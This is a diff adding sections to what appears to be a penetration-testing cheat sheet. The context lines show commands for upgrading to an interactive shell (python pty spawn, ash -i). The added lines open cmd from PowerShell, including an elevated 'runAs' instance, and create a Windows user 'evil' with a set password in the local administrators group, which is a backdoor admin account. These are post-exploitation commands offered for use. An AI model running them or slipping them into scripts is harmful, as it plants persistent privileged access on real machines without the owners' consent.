@@ -425,3 +425,17 @@ busybox httpd -f -p 18880
 python -c 'import pty; pty.spawn("/bin/bash") '
 ash -i 2>&1
 ```
+
+## Powershell to cmd
+
+```
+Start-Process cmd.exe
+Start-Process cmd.exe -verb runAs
+```
+
+## Create windows admin user
+
+```
+net user evil Ev!lpass /add
+net localgroup administrators evil /add
+```
